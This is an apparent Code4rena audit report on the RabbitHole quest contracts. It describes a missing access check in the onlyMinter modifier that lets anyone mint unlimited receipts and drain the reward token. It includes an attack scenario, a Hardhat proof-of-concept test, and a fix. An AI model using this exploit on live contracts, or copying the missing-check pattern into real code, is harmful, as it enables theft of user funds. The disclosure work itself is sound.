# Original link
https://github.com/code-423n4/2023-01-rabbithole-findings/issues/111
# Lines of code

https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/RabbitHoleReceipt.sol#L58-L61
https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/Quest.sol#L96-L118


# Vulnerability details

## Impact
```onlyMinter``` modifier in ```RabbitHoleReceipt.sol``` is implemented incorrectly. According to protocol's logic a user can call ```mintReceipt``` function to mint one token for every quest. Any user can mint unlimited amount of tokens in ```RabbitHoleReceipt.sol``` contract and therefore drain whole balance of Reward contract which address is held in ```rewardToken``` state variable in ```Quest.sol``` contract.

### Attack scenario
1. Quest creator deploys a ERC20 Reward contract with some initial supply.
2. Then he calls ```createQuest``` function from ```QuestFactory.sol``` to create a new ```Erc20Quest``` contract.
3. Then he calls ```start``` function from ```Erc20Quest.sol``` to start the quest. This function checks if Reward contract has enough balance, according to passed paramaters in ```createQuest``` function.
4. The attackers calls ```mint``` function from ```RabbitHoleReceipt.sol``` contract unlimited times** with same ```address``` and ```questId```.
** He should be careful to not run out of gas, because ```claim``` function from ```Quest.sol``` contract loops over the tokens. This can be easily bypassed with different addresses controlled by the same person.
5. Then the attacker calls ```claim``` function from ```Quest.sol``` to get the rewards. He can calculate the gas amount limit for looping over the tokens and therefore drain whole initial supply from ERC20 Reward contract with one/many account/s.

## Proof of Concept
Add a new test case in ```test/Erc20Quest.spec.ts``` file.

```js
it('should drain rewardToken contract with random address', async () => {
    const signers = await ethers.getSigners();
    const attacker = signers[15];

    // Quest contract owner starts the quest
    // Reward contract's initial supply is: totalRewardsPlusFee * 100
    // totalRewardsPlusFee = 60_030
    // Initial supply value: 60_030 * 100 = 6_003_000
    await deployedQuestContract.start()
    await ethers.provider.send('evm_increaseTime', [86400])

    // Attacker mints 10 tokens to his address, bypassing onlyMinter modifier
    for (let i = 0; i < 1000; ++i) {
      await deployedRabbitholeReceiptContract.connect(attacker).mint(attacker.address, questId)
    }

    const totalTokens = await deployedRabbitholeReceiptContract.getOwnedTokenIdsOfQuest(questId, attacker.address)
    expect(totalTokens.length).to.equal(1000)

    // Initially the attacker doesn't have any tokens, because he didn't execute claim() yet
    expect(await deployedSampleErc20Contract.balanceOf(attacker.address)).to.equal(0)

    // One account can mint ~1_000 tokens. If it is more than that, claim() function will be running out of gas
    // Gets 1000 reward amount for every token. 1_000 tokens = 1_000_000 reward amount per account
    await deployedQuestContract.connect(attacker).claim()
    expect(await deployedSampleErc20Contract.balanceOf(attacker.address)).to.equal(rewardAmount * 1_000)
})
```

## Tools Used
Hardhat

## Recommended Mitigation Steps
Require function should be added to correctly check the minter's address.

```solidity
modifier onlyMinter() {
    require(msg.sender == minterAddress);
    _;
}
```